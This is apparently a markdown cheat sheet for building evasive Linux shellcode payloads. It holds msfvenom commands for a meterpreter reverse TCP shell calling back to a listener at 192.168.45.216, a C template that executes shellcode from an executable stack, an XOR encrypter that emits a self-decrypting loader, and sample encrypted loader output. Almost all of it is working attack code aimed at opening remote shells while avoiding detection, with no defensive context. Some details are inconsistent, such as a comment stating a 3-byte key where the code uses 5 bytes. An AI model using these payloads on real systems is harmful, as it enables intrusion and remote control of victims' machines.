## Msfvenom

```
# Less Detectable
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.45.216 LPORT=7710 -f c -e x64/xor_dynamic -i 3

# More Detectable
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.45.216 LPORT=7710 -f c -e x64/xor_dynamic -i 3
```

## Compile on target host
```
gcc -o Warhead.out Warhead.c -z execstack
```

## Template
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Our payload generated by msfvenom
unsigned char buf[] = 
"\xeb\x27\x5b\x53\x5f\xb0\x42\xfc\xae\x75\xfd\x57\x59\x53";

int main(int argc, char **argv)
{
    // Run our shellcode
    int (*ret)() = (int(*)())buf;
    ret();
}

```
## Xor Encrypter

XOR encrypts shellcode with a 3 byte key. Then produces console output which can be used within a payload.c file to be compiled and executed.
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>

unsigned char buf[] = 
"\xeb\x27\x5b\x53\x5f\xb0\x44\xfc\xae\x75\xfd\x57\x59\x53"
"\x5e\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f"
"\x5b\x52\x74\x07\x80\x3e\x44\x75\xea\xeb\xe6\xff\xe1\xe8"
"\xd4\xff\xff\xff\x11\x44\xfa\x36\x4a\x42\x4e\xa1\xe4\xed"
"\xbf\x64\xec\x46\x48\x42\x4f\x9b\x17\x21\x16\x59\xee\xd6"
"\x59\xee\xd7\x77\x90\x2e\x0b\x97\x65\x16\x91\x2f\xe4\x64"
"\xfb\xfa\xf7\xee\xf0\xf9\xc5\xee\xee\xee\x19\xe4\xf2\x3e"
"\x42\x4a\x46\xa9\xe7\xe5\xb7\x6c\xe4\x4e\x40\x4a\x47\x93"
"\x1f\x29\x1e\x51\xe6\xde\x51\xe6\xdf\x7f\x98\x26\x72\x30"
"\x6d\x1e\x99\x27\xe7\x6c\xf3\xf2\xff\xe6\xf8\xf1\xcd\xe6"
"\xe6\xe6\x1f\xe7\x2e\xe0\x75\x16\x47\x86\xa9\x0f\x57\x96"
"\xc9\x52\x2e\xd6\x75\x3d\x5e\x45\x75\x18\x45\x10\x1a\x57"
"\x9a\xdf\x67\x4e\x75\x15\x5e\x46\x4f\x75\x36\x47\x86\x75"
"\x1d\x40\x75\x1e\x41\x10\x1a\x57\x9a\xdf\x67\x24\x57\x88"
"\x57\xa6\x1d\x1f\x01\x01\xdf\xb7\x32\xc7\x4e\x57\x96\xf9"
"\x75\x0f\x45\x75\x35\x47\x10\x1a\x46\x57\x9a\xdf\x66\x3a"
"\x56\xe0\xd6\x6b\x07\x48\x75\x3c\x47\x75\x1f\x75\x1a\x57"
"\x96\xf8\x57\x2e\xe9\x10\x1a\x46\x46\x40\x57\x9a\xdf\x66"
"\xd8\x75\x23\x47\x75\x1e\x40\x10\x1a\x41\x75\x61\x45\x10"
"\x1a\x57\x9a\xdf\x67\xf2\xe0\xf9\x72\x30\x0b\x97\x5b\x52";

int main() {
    int payload_length = (int) sizeof(buf);
    int line_byte_count = 0;

    // Generate a 5-byte random key
    unsigned char launch_codes[5];
    srand(time(0));
    printf("\n");

    printf("#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\n");
    printf("unsigned char Warhead[] = \n\"");
    line_byte_count = 0;
    for (int i = 0; i < payload_length; i++) {
        printf("\\x%02X", buf[i] ^ launch_codes[i % 5]);
        line_byte_count++;

        if (line_byte_count == 16) {
            printf("\"\n\"");
            line_byte_count = 0;
        }
    }
    printf("\";\n\n");
    printf("int main (int argc, char **argv) \n{\n");
    printf("    unsigned char launch_codes[5] = {");

    // Print the keys for the output
    for (int i = 0; i < 5; i++) {
        printf("0x%02X", launch_codes[i]);
        if (i < 4) printf(", ");
    }

    printf("};\n");
    printf("    int arraysize = (int) sizeof(Warhead);\n");
    printf("    for (int i=0; i<arraysize-1; i++)\n");
    printf("    {\n");
    printf("        Warhead[i] = Warhead[i]^launch_codes[i %% 5];\n");
    printf("    }\n");
    printf("    int (*ret)() = (int(*)())Warhead;\n");
    printf("    ret();\n");
    printf("}\n");

    return 0;
}
```

## Example Output payload from Encrypter.c
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

unsigned char Warhead[] = 
"\x59\x38\x24\x53\x5F\x02\x5B\x83\xAE\x75\x4F\x48\x26\x53\x5E\x38"
"\x19\x4F\x07\x48\x4D\xD8\x37\xFF\xC6\xD4\x9E\x40\x5B\x52\xC6\x18"
"\xFF\x3E\x44\xC7\xF5\x94\xE6\xFF\x53\xF7\xAB\xFF\xFF\x4D\x0E\x3B"
"\xFA\x36\xF8\x5D\x31\xA1\xE4\x5F\xA0\x1B\xEC\x46\xFA\x5D\x30\x9B"
"\x17\x93\x09\x26\xEE\xD6\xEB\xF1\xA8\x77\x90\x9C\x14\xE8\x65\x16"
"\x23\x30\x9B\x64\xFB\x48\xE8\x91\xF0\xF9\x77\xF1\x91\xEE\x19\x56"
"\xED\x41\x42\x4A\xF4\xB6\x98\xE5\xB7\xDE\xFB\x31\x40\x4A\xF5\x8C"
"\x60\x29\x1E\xE3\xF9\xA1\x51\xE6\x6D\x60\xE7\x26\x72\x82\x72\x61"
"\x99\x27\x55\x73\x8C\xF2\xFF\x54\xE7\x8E\xCD\xE6\x54\xF9\x60\xE7"
"\x2E\x52\x6A\x69\x47\x86\x1B\x10\x28\x96\xC9\xE0\x31\xA9\x75\x3D"
"\xEC\x5A\x0A\x18\x45\xA2\x05\x28\x9A\xDF\xD5\x51\x0A\x15\x5E\xF4"
"\x50\x0A\x36\x47\x34\x6A\x62\x40\x75\xAC\x5E\x6F\x1A\x57\x28\xC0"
"\x18\x24\x57\x3A\x48\xD9\x1D\x1F\xB3\x1E\xA0\xB7\x32\x75\x51\x28"
"\x96\xF9\xC7\x10\x3A\x75\x35\xF5\x0F\x65\x46\x57\x28\xC0\x19\x3A"
"\x56\x52\xC9\x14\x07\x48\xC7\x23\x38\x75\x1F\xC7\x05\x28\x96\xF8"
"\xE5\x31\x96\x10\x1A\xF4\x59\x3F\x57\x9A\x6D\x79\xA7\x75\x23\xF5"
"\x6A\x61\x40\x10\xA8\x5E\x0A\x61\x45\xA2\x05\x28\x9A\xDF\xD5\xED"
"\x9F\xF9\x72\x82\x14\xE8\x5B\x52\xB2";

int main (int argc, char **argv) 
{
    unsigned char launch_codes[5] = {0xB2, 0x1F, 0x7F, 0x00, 0x00};
    int arraysize = (int) sizeof(Warhead);
    for (int i=0; i<arraysize-1; i++)
    {
        Warhead[i] = Warhead[i]^launch_codes[i % 5];
    }
    int (*ret)() = (int(*)())Warhead;
    ret();
}
```
